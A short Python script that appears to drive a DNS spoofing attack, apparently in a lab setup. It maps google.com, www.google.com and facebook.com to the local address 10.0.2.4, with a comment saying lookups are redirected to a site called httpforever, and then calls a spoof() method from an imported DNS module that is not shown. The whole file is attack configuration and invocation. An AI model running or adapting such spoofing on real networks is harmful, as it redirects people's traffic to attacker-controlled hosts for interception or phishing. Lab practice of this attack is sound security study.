from DNS import DNS

if __name__ == '__main__':
    #redirects to httpforever
    dns_hosts = {
        b"www.google.com.": "10.0.2.4",
        b"google.com.": "10.0.2.4",
        b"facebook.com.": "10.0.2.4"
    }

    dns = DNS(dns_hosts, 0)
    dns.spoof()